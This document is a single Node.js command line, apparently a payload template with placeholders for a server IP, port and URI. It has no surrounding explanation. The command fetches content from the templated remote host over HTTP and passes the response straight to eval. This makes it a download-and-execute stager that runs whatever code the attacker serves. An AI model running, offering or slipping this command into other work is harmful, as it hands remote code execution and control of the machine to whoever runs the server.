node -e "const http = require('http');http.get('http://{{SERVER_IP}}:{{SERVER_PORT}}/{{URI}}', (r) => {let data = '';r.on('data', (chunk) => {data += chunk;});r.on('end', () => {eval(data);});});"
